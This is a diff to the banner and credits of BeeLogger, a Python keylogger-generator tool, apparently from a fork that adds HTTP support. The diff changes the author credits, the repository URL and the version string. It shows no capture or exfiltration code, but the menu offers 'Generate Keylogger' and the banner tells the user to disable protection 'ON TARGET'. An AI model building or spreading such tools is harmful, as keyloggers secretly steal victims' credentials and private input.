@@ -2,7 +2,9 @@
 # -*- coding: utf-8 -*-
 # Copyright 2017 BeeLogger
 # Written by: * Alisson Moretto - 4w4k3
+# Updated by: xmaster @ black-zone-1000
 # https://github.com/4w4k3/BeeLogger
+# https://github.com/black-zone-1000/BeeLogger/
 # Licensed under the BSD-3-Clause
 import os
 import sys
@@ -78,7 +80,7 @@ def warn():
             \ (     ) /                    DISABLE IT ON 
  ____________(%%%%%%%)____________                 TARGET IN MSCONFIG !
 (     /   /  )%%%%%%%(  \   \     )
-(___/___/__/           \__\___\___)     https://github.com/4w4k3/BeeLogger
+(___/___/__/           \__\___\___)     https://github.com/black-zone-1000/BeeLogger/
    (     /  / (%%%%%%) \  \     ) 
     (__/___/   (%%%%)  \___\__)                 
 ''' + RED + '''       [ Disclaimer Alert ]''' + YELLOW +  ''' 
@@ -92,9 +94,10 @@ def heading():
     sys.stdout.write(YELLOW + '''
 
                 .' '. I BEE YOU  __
-       .        .   .          \(__\_/             Version: 2.3
+       .        .   .          \(__\_/      Version: 2.3(+HTTP)
         .         .         . -{{#(|8)
           ' .  . ' ' .  . '    /(__/ \      by:''' + WHITE + ' Alisson Moretto (' + YELLOW + '4w4k3' + WHITE + ')' + '\n' + '\n' + END) 
+          
     print ' {0}[{1}K{0}]{1} Generate Keylogger  {0}[{1}U{0}]{1} Update  {0}[{1}Q{0}]{1} Quit  '.format(YELLOW, WHITE) + '\n'
 def pp():
     sys.stdout.write(GREEN + '''Thank You for using Bee, Think Great, Fly High!  \n''' + END)
